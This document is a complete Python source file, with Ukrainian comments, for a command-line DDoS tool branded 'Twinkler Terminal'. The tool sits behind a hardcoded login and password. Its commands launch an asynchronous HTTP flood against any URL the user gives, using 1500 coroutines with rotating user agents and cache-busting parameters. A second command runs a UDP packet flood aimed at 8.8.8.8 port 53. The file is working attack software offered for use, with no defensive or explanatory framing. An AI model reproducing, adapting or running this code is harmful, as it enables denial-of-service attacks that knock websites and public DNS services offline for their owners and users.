#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import threading
import asyncio
import random
import time
import socket
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.styles import Style

# ================== КОНСОЛЬ ==================
console = Console()

# ================== БАНЕР ==================
BANNER_TEXT = r"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ ██████╗  ██████╗ ███████╗                          ║
║   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝                          ║
║   ██║  ██║██║  ██║██║   ██║███████╗                          ║
║   ██║  ██║██║  ██║██║   ██║╚════██║                          ║
║   ██████╔╝██████╔╝╚██████╔╝███████║                          ║
║   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝                          ║
║                                                              ║
║        ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗     ║
║        ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║     ║
║           ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║     ║
║           ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║     ║
║           ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║     ║
║           ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝     ║
║                                                              ║
║                        by SeWa and Sfera                     ║
╚══════════════════════════════════════════════════════════════╝
"""

def show_banner():
    console.clear()
    width = console.width
    lines = BANNER_TEXT.splitlines()
    max_len = max(len(line) for line in lines) if lines else 0
    if width > max_len:
        padding = (width - max_len) // 2
        centered = "\n".join(" " * padding + line for line in lines)
    else:
        centered = BANNER_TEXT
    console.print(Text(centered, style="bold cyan"), justify="center")

# ================== ГЛОБАЛЬНІ СТРУКТУРИ ==================
log_lines = []
max_log_lines = 100
active_attacks = {}
internet_attack_active = False
internet_attack_event = None

# ================== ЛОГ ==================
def add_log(text, color="white"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    colored = Text(f"[{timestamp}] ", style="dim cyan") + Text(text, style=color)
    log_lines.append(colored)
    if len(log_lines) > max_log_lines:
        log_lines.pop(0)

# ================== АТАКА НА САЙТ ==================
async def site_flood_async(url, stop_event, tasks=1500, req_per_task=500, timeout=3):
    import aiohttp
    from aiohttp import ClientTimeout, TCPConnector
    connector = TCPConnector(limit=0, limit_per_host=0, ssl=False)
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
    ]
    def random_ua(): return random.choice(user_agents)
    def random_param(): return f"_cb={random.randint(1,10**18)}&_ts={int(time.time()*1000)}"
    async def worker(session, wid):
        ok, fail = 0, 0
        count = 0
        while not stop_event.is_set() and (req_per_task == 0 or count < req_per_task):
            url_with = url + "?" + random_param()
            headers = {
                "User-Agent": random_ua(),
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }
            try:
                async with session.get(url_with, headers=headers, timeout=ClientTimeout(total=timeout)) as resp:
                    await resp.read()
                    if resp.status < 400: ok += 1
                    else: fail += 1
            except:
                fail += 1
            count += 1
            if count % 50 == 0:
                add_log(f"[{url}] Потік {wid}: {count} зап., успіх={ok}, помилок={fail}", "cyan")
        return ok, fail

    async with aiohttp.ClientSession(connector=connector) as session:
        add_log(f"Запущено атаку на {url} з {tasks} корутин", "green")
        coros = [worker(session, i) for i in range(tasks)]
        results = await asyncio.gather(*coros, return_exceptions=True)
        total_ok = sum(r[0] for r in results if isinstance(r, tuple))
        total_fail = sum(r[1] for r in results if isinstance(r, tuple))
        add_log(f"[{url}] Атака завершена. Успіх: {total_ok}, Помилок: {total_fail}", "yellow")
        if url in active_attacks:
            del active_attacks[url]

def run_site_attack(url, stop_event):
    asyncio.set_event_loop(asyncio.new_event_loop())
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(site_flood_async(url, stop_event))
    except Exception as e:
        add_log(f"Помилка в атаці на {url}: {e}", "red")
    finally:
        loop.close()

def start_site_attack(url):
    if url in active_attacks:
        add_log(f"Атака на {url} вже запущена", "yellow")
        return
    stop_event = threading.Event()
    thread = threading.Thread(target=run_site_attack, args=(url, stop_event), daemon=True)
    thread.start()
    active_attacks[url] = {'event': stop_event, 'thread': thread}
    add_log(f"▶ Атака на {url} запущена", "green")

def stop_site_attack(url):
    if url not in active_attacks:
        add_log(f"Атака на {url} не знайдена", "yellow")
        return
    event = active_attacks[url]['event']
    event.set()
    add_log(f"⏹ Сигнал зупинки для {url} відправлено", "yellow")
    thread = active_attacks[url]['thread']
    thread.join(timeout=3.0)
    del active_attacks[url]
    add_log(f"✅ Атака на {url} зупинена", "green")

# ================== АТАКА НА ІНТЕРНЕТ ==================
def internet_flood(stop_event, target="8.8.8.8", port=53, size=1400, rate=0.0001):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    payload = bytearray(random.getrandbits(8) for _ in range(size))
    add_log(f"🌐 UDP-флуд на {target}:{port} запущено", "magenta")
    counter = 0
    while not stop_event.is_set():
        try:
            sock.sendto(bytes(payload), (target, port))
            counter += 1
            if counter % 500 == 0:
                add_log(f"[UDP] Відправлено {counter} пакетів", "dim magenta")
        except:
            pass
        time.sleep(rate)
    sock.close()
    add_log("🌐 UDP-флуд зупинено", "magenta")

def start_internet_attack():
    global internet_attack_active, internet_attack_event
    if internet_attack_active:
        add_log("Атака на інтернет вже запущена", "yellow")
        return
    internet_attack_event = threading.Event()
    thread = threading.Thread(target=internet_flood, args=(internet_attack_event,), daemon=True)
    thread.start()
    internet_attack_active = True
    add_log("⚡ Інтернет-флуд активовано", "red")

def stop_internet_attack():
    global internet_attack_active, internet_attack_event
    if not internet_attack_active:
        add_log("Атака на інтернет не запущена", "yellow")
        return
    if internet_attack_event:
        internet_attack_event.set()
        internet_attack_active = False
        add_log("⏹ Сигнал зупинки UDP-флуду надіслано", "yellow")

# ================== КОМАНДИ ==================
def show_help():
    add_log("""
╔══════════════════════════════════════════════════════════════╗
║                    ДОСТУПНІ КОМАНДИ                          ║
╠══════════════════════════════════════════════════════════════╣
║ /help                – показати цю довідку                   ║   
║ /clear               – очистити лог                          ║
║ /exit                – вийти з програми                      ║
║ /start-ddos.site-<URL> – запустити атаку на сайт             ║
║ /stop-ddos.site-<URL>  – зупинити атаку на сайт              ║
║ /start-ddos.internet   – забити власний інтернет (UDP)       ║
║ /stop-ddos.internet    – зупинити флуд інтернету             ║
╚══════════════════════════════════════════════════════════════╝
    """, "cyan")

def process_cmd(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    if cmd == "/help":
        show_help()
    elif cmd == "/clear":
        log_lines.clear()
        add_log("Екран очищено", "dim")
    elif cmd == "/exit":
        add_log("Завершення роботи...", "red")
        for url in list(active_attacks.keys()):
            stop_site_attack(url)
        if internet_attack_active:
            stop_internet_attack()
        sys.exit(0)
    elif cmd == "/start-ddos.internet":
        start_internet_attack()
    elif cmd == "/stop-ddos.internet":
        stop_internet_attack()
    elif cmd.startswith("/start-ddos.site-"):
        url = cmd[len("/start-ddos.site-"):].strip()
        if not url:
            add_log("❌ Не вказано URL", "red")
        else:
            start_site_attack(url)
    elif cmd.startswith("/stop-ddos.site-"):
        url = cmd[len("/stop-ddos.site-"):].strip()
        if not url:
            add_log("❌ Не вказано URL", "red")
        else:
            stop_site_attack(url)
    else:
        add_log(f"❌ Невідома команда: {cmd}", "red")

# ================== ПОБУДОВА ІНТЕРФЕЙСУ ==================
def generate_header():
    status_text = "🟢 ONLINE"
    if active_attacks:
        status_text = f"🔴 АТАКИ: {len(active_attacks)} САЙТІВ"
    if internet_attack_active:
        status_text += " | 🌐 ІНТЕРНЕТ ФЛУД"
    header = Panel(
        Text("TWINKLER TERMINAL", style="bold cyan") + " " + 
        Text(status_text, style="bold yellow"),
        box=box.ROUNDED,
        border_style="bright_blue"
    )
    return header

def generate_body():
    if not log_lines:
        empty = Text("Очікування команд...", style="dim italic")
        return Panel(empty, box=box.SIMPLE, border_style="gray")
    content = Text("\n".join(line.plain for line in log_lines[-max_log_lines:]))
    return Panel(content, box=box.SIMPLE, border_style="gray", title="ЛОГ ПОДІЙ", title_align="left")

def generate_footer():
    footer = Panel(
        Text("➜ Введіть /help для списку команд", style="dim green"),
        box=box.ROUNDED,
        border_style="bright_black"
    )
    return footer

# ================== ГОЛОВНА ФУНКЦІЯ ==================
def main():
    # Перевірка aiohttp
    try:
        import aiohttp
    except ImportError:
        console.print("[red]⚠️ aiohttp не встановлено. Атаки на сайти недоступні.[/red]")
        console.print("[yellow]Встановіть: pip install aiohttp[/yellow]")

    # Банер
    show_banner()

    # АВТОРИЗАЦІЯ через prompt_toolkit (пароль прихований з зірочками)
    console.print("\n[bold cyan]Вхід до системи[/bold cyan]")
    auth_style = Style.from_dict({'prompt': 'ansicyan', 'input': 'ansigreen'})
    auth_session = PromptSession(style=auth_style)

    try:
        login = auth_session.prompt("[yellow]Логін: [/yellow]")
        if login != "SeWa":
            console.print("[red]❌ Невірний логін. Вихід.[/red]")
            sys.exit(1)

        # Пароль з прихованим введенням (показує зірочки)
        password = auth_session.prompt("[yellow]Пароль: [/yellow]", is_password=True)
        if password != "DDOS SeWas":
            console.print("[red]❌ Невірний пароль. Вихід.[/red]")
            sys.exit(1)
    except KeyboardInterrupt:
        console.print("\n[red]Перервано користувачем. Вихід.[/red]")
        sys.exit(0)

    console.print("[green]✅ Авторизація успішна! Запуск термінала...[/green]")
    time.sleep(1)
    console.clear()
    show_banner()
    add_log("🖥️ Twinkler Terminal v3.0 запущено", "bright_cyan")
    add_log("Введіть /help для списку команд", "dim green")

    # Стиль для основної сесії
    style = Style.from_dict({
        'prompt': 'ansicyan bold',
        'input': 'ansigreen',
    })

    # Автодоповнення
    completer = WordCompleter([
        '/help', '/clear', '/exit',
        '/start-ddos.site-', '/stop-ddos.site-',
        '/start-ddos.internet', '/stop-ddos.internet'
    ], ignore_case=True)

    # Основна сесія з історією
    session = PromptSession(
        history=FileHistory('.twinkler_history'),
        auto_suggest=AutoSuggestFromHistory(),
        completer=completer,
        style=style,
    )

    # Live-цикл
    with Live(refresh_per_second=1) as live:
        while True:
            try:
                layout = Layout()
                layout.split(
                    Layout(generate_header(), size=5),
                    Layout(generate_body()),
                    Layout(generate_footer(), size=5)
                )
                live.update(layout)

                cmd = session.prompt("➜ ", style=style)
                process_cmd(cmd)

            except KeyboardInterrupt:
                continue
            except EOFError:
                break
            except Exception as e:
                add_log(f"❌ Помилка: {e}", "red")

if __name__ == "__main__":
    main()